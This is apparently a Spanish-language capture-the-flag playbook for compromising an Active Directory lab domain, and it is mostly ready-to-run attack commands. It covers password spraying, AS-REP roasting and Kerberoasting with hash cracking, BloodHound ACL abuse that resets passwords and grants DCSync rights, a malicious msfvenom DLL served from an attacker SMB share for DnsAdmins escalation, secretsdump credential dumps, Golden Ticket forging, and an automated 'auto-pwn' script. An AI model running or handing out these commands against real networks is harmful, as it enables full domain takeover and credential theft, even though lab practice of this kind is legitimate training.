# 🏆 CTF Active Directory - GUÍA MAESTRA
## Itmar Castillo - Estrategia para Primer Lugar

```
DOMINIO:   lab.local
DC_IP:     172.31.254.146  (DC01)
CLIENT_IP: 172.31.254.147  (CLIENT01)
RED:       172.31.254.0/24
KALI_IP:   172.31.254.XXX  (la que te asigne el DHCP)
```

---

## 📋 ESTRATEGIA GENERAL (ORDEN DE ATAQUE)

```
FASE 1: RECON  (5 min)
FASE 2: USUARIOS + CREDENCIALES (10 min)
FASE 3: KERBEROS ATTACKS (15 min)
FASE 4: BLOODHOUND + ESCALADA (20 min)
FASE 5: DOMINIO TOTAL (15 min)
FASE 6: GOLDEN TICKET (10 min)
```

---

## 🎯 RETO 1: Reconocimiento del dominio (50 pts)

### Lo que necesitas obtener:
- IP del Domain Controller (DC)
- Nombre del dominio (DOMAIN.LOCAL)
- NetBIOS name
- Rango de IPs
- Servidores DNS

### Comandos KRUSHER:

```bash
# 1. Descubrir DC con Nmap
nmap -sn 172.31.254.0/24 -oN recon/nmap_ping.txt
nmap -sVC -p 53,88,135,139,389,445,636,3268,3389,5985 <DC_IP> -oN recon/nmap_dc.txt

# 2. Enumeracion basica del dominio
nmap --script ldap-rootdse -p 389 <DC_IP> -oN recon/ldap_rootdse.txt

# 3. Obtener dominio con smbclient
smbclient -L //<DC_IP> -N 2>/dev/null

# 4. Obtener informacion con enum4linux-ng
enum4linux-ng -A <DC_IP> -oA recon/enum4linux

# 5. DNS recon con dnsrecon
dnsrecon -d <DOMINIO> -a -n <DC_IP>

# 6. ldapsearch basico
ldapsearch -x -H ldap://<DC_IP> -b "DC=DOMINIO,DC=LOCAL" -s base 2>/dev/null | tee recon/ldap_base.txt
```

### Data mínima a registrar:
```
DOMAIN = lab.local
DC_IP  = 172.31.254.X
DC_HOSTNAME = DC01.lab.local
NETBIOS = LAB
```

---

## 🎯 RETO 2: Enumeración de usuarios (50 pts)

### Lo que necesitas:
- Lista de todos los usuarios del dominio
- Identificar: admin, service accounts, usuarios regulares
- Grupos del dominio

### Comandos KRUSHER:

```bash
# 1. Enumerar usuarios con ldapsearch (ANONIMO)
ldapsearch -x -H ldap://<DC_IP> -b "DC=DOMINIO,DC=LOCAL" \
  "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | \
  awk '{print $2}' | tee recon/usuarios.txt

# 2. Enumerar grupos
ldapsearch -x -H ldap://<DC_IP> -b "DC=DOMINIO,DC=LOCAL" \
  "(objectClass=group)" name | grep "^name:" | \
  awk '{print $2}' | tee recon/grupos.txt

# 3. Enumerar con enum4linux-ng (mas detalle)
enum4linux-ng -u "" -p "" -U <DC_IP> | tee recon/enum_users.txt

# 4. Con credenciales (cuando tengas una)
enum4linux-ng -u "usuario" -p "password" -U <DC_IP> | tee recon/enum_users_auth.txt

# 5. CrackMapExec - usuarios
crackmapexec smb <DC_IP> -u "" -p "" --users 2>/dev/null | tee recon/cme_users.txt

# 6. CrackMapExec - grupos locales
crackmapexec smb <DC_IP> -u "" -p "" --local-groups 2>/dev/null | tee recon/cme_groups.txt

# 7. Con credenciales - full enum
crackmapexec smb <DC_IP> -u "usuario" -p "password" --users --groups | tee recon/cme_full.txt

# 8. ldapdomaindump (con credenciales)
ldapdomaindump ldap://<DC_IP> -u "DOMINIO\\usuario" -p "password" -o recon/ldap_dump/
```

---

## 🎯 RETO 3: Password en description (100 pts)

### Objetivo:
Buscar contraseñas escritas en el atributo `description` de usuarios del AD.

### Comandos KRUSHER:

```bash
# 1. SIN credenciales (si el DC permite anonimo)
ldapsearch -x -H ldap://<DC_IP> -b "DC=DOMINIO,DC=LOCAL" \
  "(description=*)" sAMAccountName description | \
  tee creds/passwords_in_description.txt

# 2. CON credenciales (mucho mejor)
ldapsearch -x -H ldap://<DC_IP> -D "DOMINIO\\usuario" -w "password" \
  -b "DC=DOMINIO,DC=LOCAL" "(description=*)" sAMAccountName description | \
  grep -A1 "sAMAccountName:" | grep -v "^--$" | tee creds/creds_description.txt

# 3. Buscar patrones especificos de password
ldapsearch -x -H ldap://<DC_IP> -D "DOMINIO\\usuario" -w "password" \
  -b "DC=DOMINIO,DC=LOCAL" "(description=*)" sAMAccountName description | \
  grep -i -E "pass|contrase|pwd|123|admin|key" -B1 | tee creds/passwords_found.txt

# 4. CrackMapExec - buscar descriptions sospechosas
crackmapexec ldap <DC_IP> -u "usuario" -p "password" -M user-desc | \
  tee creds/cme_description.txt

# 5. ADSI Edit / PowerShell desde Windows (si tienes shell)
# powershell -c "Get-ADUser -Filter * -Properties Description | where {$_.Description -ne $null} | ft Name,Description"
```

### 🏁 FLAG: Busca en description del usuario con pass/contraseña

---

## 🎯 RETO 4: Password por defecto (100 pts)

### Objetivo:
Encontrar usuarios con contraseñas débiles o por defecto.

### Comandos KRUSHER:

```bash
# Crear lista de usuarios objetivo
USUARIOS=$(cat recon/usuarios.txt)

# Probar contraseñas por defecto con Kerbrute
# Password predeterminadas comunes en AD:
# - Usuario = Password
# - Password estacional: Spring2024, Summer2024, Otoño2024, Invierno2024
# - Nombre de usuario
# - ChangeMe123!
# - Password123!

# 1. Kerbrute - fuerza bruta de kerberos (no deja logs)
kerbrute passwordspray -d lab.local --dc <DC_IP> \
  recon/usuarios.txt "Password123!" -o creds/kerbrute_pass123.txt

kerbrute passwordspray -d lab.local --dc <DC_IP> \
  recon/usuarios.txt "ChangeMe123!" -o creds/kerbrute_changeme.txt

kerbrute passwordspray -d lab.local --dc <DC_IP> \
  recon/usuarios.txt "<ESTACION><AÑO>" -o creds/kerbrute_season.txt

# 2. Probar usuario = password
for u in $(cat recon/usuarios.txt); do
  kerbrute passwordspray -d lab.local --dc <DC_IP> \
    <(echo "$u") "$u" 2>/dev/null | grep -i "VALID" >> creds/user_is_pass.txt
done

# 3. CrackMapExec - password spray (CUIDADO: deja logs)
crackmapexec smb <DC_IP> -u recon/usuarios.txt \
  -p "Password123!" --continue-on-success 2>/dev/null | \
  grep "[+]" | tee creds/cme_valid_creds.txt

# 4. SMB NULL sessions - probar si alguna cuenta no tiene pass
impacket-smbclient -no-pass "lab.local/username"@<DC_IP> 2>/dev/null
```

### 🏁 FLAG: Usuario con contraseña debil/docil

---

## 🎯 RETO 5: AS-REP Roasting (150 pts)

### Objetivo:
Encontrar usuarios sin pre-autenticacion Kerberos y crackear su hash.

### Comandos KRUSHER:

```bash
# 1. SIN credenciales - detectar AS-REP roastable users
impacket-GetNPUsers "lab.local/" -dc-ip <DC_IP> -no-pass \
  -usersfile recon/usuarios.txt | tee creds/asrep_users.txt

# 2. CON credenciales (mas completo)
impacket-GetNPUsers "lab.local/usuario:password" \
  -dc-ip <DC_IP> -request -format hashcat | tee creds/asrep_hashes.txt

# 3. Con ldapsearch - buscar usuarios sin preauth
ldapsearch -x -H ldap://<DC_IP> -D "DOMINIO\\usuario" -w "password" \
  -b "DC=DOMINIO,DC=LOCAL" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName | grep sAMAccountName | tee creds/asrep_users_ldap.txt

# 4. CRACKEAR los hashes con hashcat
hashcat -m 18200 creds/asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  --force -O -w 4 | tee creds/asrep_cracked.txt

# 5. O con john
john --wordlist=/usr/share/wordlists/rockyou.txt creds/asrep_hashes.txt | \
  tee creds/asrep_john.txt
```

### 📝 FORMATO DEL HASH:
```
$krb5asrep$23$<user>@lab.local:<hash>
```

### 🏁 FLAG: Password del usuario AS-REP roastable

---

## 🎯 RETO 6: Kerberoasting (150 pts)

### Objetivo:
Obtener TGS tickets de cuentas de servicio y crackearlos.

### Comandos KRUSHER:

```bash
# 1. CON credenciales - kerberoasting clasico
impacket-GetUserSPNs "lab.local/usuario:password" \
  -dc-ip <DC_IP> -request | tee creds/kerberoast_hashes.txt

# 2. Guardar solo los hashes en formato hashcat
impacket-GetUserSPNs "lab.local/usuario:password" \
  -dc-ip <DC_IP> -request -outputfile creds/kerberoast_hashes_hc.txt

# 3. CRACKEAR con hashcat
hashcat -m 13100 creds/kerberoast_hashes_hc.txt \
  /usr/share/wordlists/rockyou.txt --force -O -w 4 | \
  tee creds/kerberoast_cracked.txt

# 4. Con john
john --wordlist=/usr/share/wordlists/rockyou.txt \
  creds/kerberoast_hashes_hc.txt | tee creds/kerberoast_john.txt

# 5. Kerberoasting con target especifico
impacket-GetUserSPNs "lab.local/usuario:password" \
  -dc-ip <DC_IP> -request -spn "MSSQLSvc/SQL01.lab.local:1433" | \
  tee creds/kerberoast_sql.txt
```

### 📝 FORMATO DEL HASH:
```
$krb5tgs$23$*<service>$<domain>$<spn>*$<hash>
```

### 🏁 FLAG: Password de la cuenta de servicio

---

## 🎯 RETO 7: BloodHound - Abuso de ACL (250 pts)

### Objetivo:
Analizar rutas de escalada de privilegios usando BloodHound.

### Comandos KRUSHER:

```bash
# ===== FASE 1: RECOLECTAR DATOS =====

# 1. BloodHound-python (desde kali - SIN credenciales limitado)
bloodhound-python -d lab.local -u "usuario" -p "password" \
  -gc "DC01.lab.local" -c All -ns <DC_IP> \
  --zip -o bloodhound_data/

# 2. O con credenciales (mejor)
bloodhound-python -d lab.local -u "usuario" -p "password" \
  -dc <DC_IP> -c All -ns <DC_IP> --zip -o bloodhound_data/

# 3. SharpHound desde Windows (si tienes acceso a una maquina dominio)
# powershell -c "
#   Invoke-WebRequest -Uri 'http://<KALI_IP>:8000/SharpHound.exe' -OutFile 'C:\temp\SharpHound.exe'
#   C:\temp\SharpHound.exe -c All --zipfilename bloodhound
# "

# ===== FASE 2: INICIAR NEO4J + BLOODHOUND =====

# 4. Iniciar Neo4j
sudo neo4j start
# Default creds: neo4j:neo4j

# 5. Iniciar BloodHound
bloodhound --no-sandbox &

# 6. Subir el zip a BloodHound (drag & drop)

# ===== FASE 3: QUERIES KRUSHER =====

# QUERIES BLOODHOUND (escribe en el buscador):
# 
# 1. "Find all Domain Admins" - Mapa de DA
# 2. "Shortest Paths to Domain Admins from Owned Principals" 
#    -> CAMINO MAS CORTO A DOMAIN ADMIN
# 3. "Find Computers where Domain Users are Local Admin"
#    -> MAQUINAS DONDE SOMOS ADMIN
# 4. "Find Principals with DCSync Rights"
#    -> QUIEN PUEDE HACER DCSync
# 5. "Find all users with GenericAll permissions"
#    -> PERMISOS PELIGROSOS
# 6. "Find all ACEs for <USUARIO>"
#    -> PERMISOS ESPECIFICOS
# 7. "Shortest Paths to High-Value Targets"
#    -> RUTAS A OBJETIVOS VALIOSOS

# CUSTOM CYPHER QUERIES (BloodHound -> Raw Query):
#
# Abuse GenericAll on User -> Reset password + Pwn
# MATCH p = (u:User)-[r:GenericAll]->(target:User) RETURN p
#
# Abuse GenericAll on Group -> Add user to group
# MATCH p = (u:User)-[r:GenericAll]->(g:Group) RETURN p
#
# Abuse WriteDACL -> Grant DCSync rights
# MATCH p = (u:User)-[r:WriteDacl|WriteOwner|GenericAll]->(t:Domain) RETURN p

# ===== FASE 4: ABUSAR ACLs =====

# Si encuentras GenericAll sobre un usuario:
impacket-bloodhound -u "usuario" -p "password" -d lab.local \
  -dc-ip <DC_IP> -c ResetPassword -target "victima" -newpass "NuevoPass123!"

# O manualmente (usando impacket-smbexec con nuevas creds):
impacket-smbexec "lab.local/victima:NuevoPass123!"@<DC_IP>

# Si encuentras WriteDACL/GenericAll sobre el dominio:
# Puedes otorgarte DCSync rights con:
impacket-dacledit "lab.local/usuario:password" \
  -dc-ip <DC_IP> -action write -rights DCSync \
  -principal usuario -target "DC=DOMINIO,DC=LOCAL"
```

### 🏁 FLAG: Ruta de escalada encontrada / Nuevas credenciales obtenidas

---

## 🎯 RETO 8: DnsAdmins a SYSTEM (250 pts)

### Objetivo:
Escalar privilegios siendo miembro del grupo DnsAdmins.

### Comandos KRUSHER:

```bash
# ===== VERIFICAR SI SOMOS DnsAdmins =====

# 1. Con ldapsearch
ldapsearch -x -H ldap://<DC_IP> -D "DOMINIO\\usuario" -w "password" \
  -b "DC=DOMINIO,DC=LOCAL" \
  "(&(objectClass=group)(cn=DnsAdmins))" member | tee recon/dnsadmins.txt

# 2. Con BloodHound
# Buscar: "Find all members of DnsAdmins"

# 3. Con CrackMapExec
crackmapexec ldap <DC_IP> -u "usuario" -p "password" \
  -M group-mem -o GROUP="DnsAdmins" | tee recon/cme_dnsadmins.txt

# ===== ABUSAR DnsAdmins =====

# 4. Si somos DnsAdmins -> cargar DLL maliciosa en DNS

# Primero, crear DLL maliciosa:
msfvenom -p windows/x64/exec CMD="powershell -enc <COMANDO_ENCODED>" \
  -f dll -o /tmp/pwned.dll

# 5. Compartir la DLL via SMB
# En Kali:
sudo impacket-smbserver -smb2support share /tmp/

# 6. En el DC (via shell remota o WMI):
# dnscmd <DC_HOSTNAME> /config /serverlevelplugindll \\<KALI_IP>\share\pwned.dll

# 7. Forzar recarga del DNS server:
# sc \\<DC_HOSTNAME> stop dns
# sc \\<DC_HOSTNAME> start dns

# 8. Alternativa: Usar dnstool.py de krbrelayx
git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx
python3 /opt/krbrelayx/dnstool.py -u "lab.local\\usuario" -p "password" \
  --record "pwned" --action add --data <KALI_IP> --type A <DC_IP>

# 9. Para escalar directamente a SYSTEM:
# Una vez cargada la DLL, el servicio DNS corre como SYSTEM
# La DLL ejecutara nuestro comando como SYSTEM

# 10. Alternativa: WMI + DnsAdmins
wmic /node:<DC_IP> /user:"lab.local\usuario" /password:"password" \
  process call create "dnscmd <DC_HOSTNAME> /config /serverlevelplugindll \\<KALI_IP>\share\evil.dll"
```

### 🏁 FLAG: Shell como SYSTEM en el DC

---

## 🎯 RETO 9: DCSync - Volcado de krbtgt (300 pts)

### Objetivo:
Tener permisos de replicacion de dominio (DCSync) y volcar hashes.

### Comandos KRUSHER:

```bash
# ===== VERIFICAR SI TENEMOS DERECHOS DCSync =====

# 1. BloodHound - buscar "Find Principals with DCSync Rights"
# Si eres: Domain Admin, Enterprise Admin, o tienes permisos
# Replicating Directory Changes, Replicating Directory Changes All

# 2. Con ldapsearch
ldapsearch -x -H ldap://<DC_IP> -D "DOMINIO\\usuario" -w "password" \
  -b "DC=DOMINIO,DC=LOCAL" "(userPrincipalName=*)" | grep -i "Replicating"

# 3. Dump de todos los hashes con secretsdump
impacket-secretsdump "lab.local/usuario:password"@<DC_IP> \
  -just-dc | tee creds/dcsync_all_hashes.txt

# 4. Solo krbtgt
impacket-secretsdump "lab.local/usuario:password"@<DC_IP> \
  -just-dc-user krbtgt | tee creds/krbtgt_hash.txt

# 5. Dump de SAM + SYSTEM + SECURITY
impacket-secretsdump "lab.local/usuario:password"@<DC_IP> \
  -just-dc-ntlm | tee creds/dcsync_ntlm.txt

# 6. Con Pass-the-Hash (si tienes hash pero no password)
impacket-secretsdump -hashes :<NTLM_HASH> \
  "lab.local/administrator"@<DC_IP> -just-dc-user krbtgt
```

### 📝 Lo que necesitas guardar del krbtgt:
```
krbtgt:<RID>:<LM_HASH>:<NTLM_HASH>:<BLANK>
DOMAIN SID: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

### 🏁 FLAG: Hash del krbtgt + SID del dominio

---

## 🎯 RETO 10: Golden Ticket (400 pts - BONUS)

### Objetivo:
Crear un Golden Ticket y obtener acceso TOTAL al dominio.

### Requisitos:
- Hash NTLM del krbtgt (del reto 9)
- SID del dominio
- Nombre de dominio

### Comandos KRUSHER:

```bash
# ===== OBTENER DATOS NECESARIOS =====
# Los datos del reto 9:
KRBTGT_HASH = <NTLM_HASH_DEL_KRBTGT>
DOMAIN_SID  = S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# ===== CREAR GOLDEN TICKET =====

# 1. Con impacket-ticketer
impacket-ticketer -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain lab.local \
  -dc <DC_IP> \
  administrator

# Esto genera: administrator.ccache

# 2. Verificar el ticket
export KRB5CCNAME=administrator.ccache
klist

# 3. Usar el ticket para acceso total
# Acceso por SMB
export KRB5CCNAME=administrator.ccache
impacket-smbexec "lab.local/administrator"@<DC_IP> -k -no-pass

# 4. Dump de todos los hashes
export KRB5CCNAME=administrator.ccache
impacket-secretsdump "lab.local/administrator"@<DC_IP> -k -no-pass

# 5. Acceso por PSexec
export KRB5CCNAME=administrator.ccache
impacket-psexec "lab.local/administrator"@<DC_IP> -k -no-pass

# 6. Acceso por WinRM
export KRB5CCNAME=administrator.ccache
impacket-wmiexec "lab.local/administrator"@<DC_IP> -k -no-pass

# 7. Para Windows (Mimikatz):
# mimikatz # kerberos::golden /domain:lab.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /id:500
# mimikatz # kerberos::ptt ticket.kirbi
# klist
```

### 🏁 FLAG: Acceso total al dominio (THE END)

---

## 🚀 AUTO-PWN SCRIPT COMPLETO

```bash
#!/bin/bash
# ============================================================
# CTF-AD-AUTO-PWN.sh - Auto-Pwn del Dominio
# Modo de uso: chmod +x ctf-ad-auto-pwn.sh && ./ctf-ad-auto-pwn.sh
# ============================================================

DC_IP="${1:-172.31.254.10}"
DOMAIN="${2:-lab.local}"
KALI_IP=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

mkdir -p {recon,creds,bloodhound_data,loot}

echo "[+] FASE 1: RECONOCIMIENTO"
nmap -sVC -p 53,88,135,139,389,445,636,3268,3389,5985 $DC_IP -oN recon/nmap_dc.txt
enum4linux-ng -A $DC_IP -oA recon/enum4linux 2>/dev/null

echo "[+] FASE 2: ENUMERACION USUARIOS"
ldapsearch -x -H ldap://$DC_IP -b "DC=${DOMAIN%.LOCAL},DC=LOCAL" \
  "(objectClass=user)" sAMAccountName 2>/dev/null | \
  grep "sAMAccountName:" | awk '{print $2}' | tee recon/usuarios.txt

echo "[+] FASE 3: AS-REP ROASTING"
impacket-GetNPUsers "$DOMAIN/" -dc-ip $DC_IP -no-pass \
  -usersfile recon/usuarios.txt 2>/dev/null | tee creds/asrep_hashes.txt

echo "[+] FASE 4: BUSCAR PASSWORDS EN DESCRIPTION"
ldapsearch -x -H ldap://$DC_IP -b "DC=${DOMAIN%.LOCAL},DC=LOCAL" \
  "(description=*)" sAMAccountName description 2>/dev/null | \
  grep -B1 -i "pass\|contrase\|pwd\|123" | tee creds/passwords_found.txt

echo "[+] FASE 5: PASSWORD SPRAY"
for pass in "Password123!" "ChangeMe123!" "Admin123!" "P@ssw0rd"; do
  kerbrute passwordspray -d $DOMAIN --dc $DC_IP recon/usuarios.txt "$pass" \
    2>/dev/null >> creds/valid_creds.txt
done

echo "[+] FASE 6: KERBEROASTING (con primeras credenciales)"
if [ -s creds/valid_creds.txt ]; then
  USER=$(head -1 creds/valid_creds.txt | awk '{print $1}')
  PASS=$(head -1 creds/valid_creds.txt | awk '{print $NF}')
  impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request \
    -outputfile creds/kerberoast_hashes.txt 2>/dev/null
  bloodhound-python -d $DOMAIN -u "$USER" -p "$PASS" -dc $DC_IP \
    -c All -ns $DC_IP --zip -o bloodhound_data/ 2>/dev/null
fi

echo "[+] FASE 7: DCSYNC (si tenemos DA)"
impacket-secretsdump "$DOMAIN/administrator:password"@$DC_IP \
  -just-dc-user krbtgt 2>/dev/null | tee creds/krbtgt.txt

echo ""
echo "======================================"
echo "  ESCANEO COMPLETO - REVISA creds/"
echo "======================================"
```

---

## ⚡ COMANDOS RAPIDOS POR FASE

### FASE 1 - Recon (5 min)
```bash
nmap -sn 172.31.254.0/24
export DC=<IP_DC>
export DOM=<lab.local>
```

### FASE 2 - Usuarios (2 min)
```bash
enum4linux-ng -A $DC -oA recon/e4l
ldapsearch -x -H ldap://$DC -b "DC=$D,DC=LOCAL" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt
```

### FASE 3 - Passwords (3 min)
```bash
ldapsearch -x -H ldap://$DC -b "DC=$D,DC=LOCAL" "(description=*)" sAMAccountName description | grep -B1 -i pass
```

### FASE 4 - AS-REP (3 min)
```bash
impacket-GetNPUsers "$DOM/" -dc-ip $DC -no-pass -usersfile users.txt
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

### FASE 5 - Kerberoast (3 min)
```bash
impacket-GetUserSPNs "$DOM/user:pass" -dc-ip $DC -request
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

### FASE 6 - BloodHound (10 min)
```bash
bloodhound-python -d $DOM -u "user" -p "pass" -dc $DC -c All -ns $DC --zip
sudo neo4j start && bloodhound --no-sandbox &
```

### FASE 7 - DCSync (2 min)
```bash
impacket-secretsdump "$DOM/user:pass"@$DC -just-dc-user krbtgt
```

### FASE 8 - Golden Ticket (2 min)
```bash
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <SID> -domain $DOM administrator
export KRB5CCNAME=administrator.ccache
impacket-smbexec "$DOM/administrator"@$DC -k -no-pass
```

---

## 🧰 CHECKLIST DE PREPARACION EN KALI

```bash
# Instalar todo lo necesario
sudo apt update && sudo apt install -y \
  impacket-scripts bloodhound python3-ldapdomaindump \
  enum4linux-ng crackmapexec kerbrute hashcat \
  ldap-utils smbclient nmap dnsrecon

# Instalar BloodHound-python
pip3 install bloodhound-py

# Descargar wordlists
sudo apt install -y wordlist rockyou
gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null

# Crear estructura de directorios
mkdir -p ~/CTF/{recon,creds,bloodhound_data,loot,exploits}
```

---

## 🏆 RESUMEN: TU RUTA AL PRIMER LUGAR

```
1. RECON  → NMAP + enum4linux-ng          → 5 min  → 50 pts
2. USERS  → ldapsearch                     → 2 min  → 50 pts
3. DESCR  → ldapsearch description         → 2 min  → 100 pts
4. DEBIL  → kerbrute password spray        → 5 min  → 100 pts
5. ASREP  → GetNPUsers + hashcat           → 5 min  → 150 pts
6. KERB   → GetUserSPNs + hashcat          → 5 min  → 150 pts
7. BH     → bloodhound-python + queries    → 15 min → 250 pts
8. DNS    → dnscmd + DLL injection         → 10 min → 250 pts
9. DCSync → secretsdump                    → 5 min  → 300 pts
10. GOLD  → ticketer + SMB/WinRM           → 5 min  → 400 pts
                               TOTAL:      ~1 HORA → 1750 PTS
```

> **RECUERDA**: Documenta TODO. Una credencial de un reto te sirve para el siguiente.
> Si te atoras en un reto, SALTALO y vuelve. Los puntos faciles primero.
> Usa `tee` para guardar outputs siempre. Organiza en carpetas.
> BUENA SUERTE ITMAR! 🏆
```
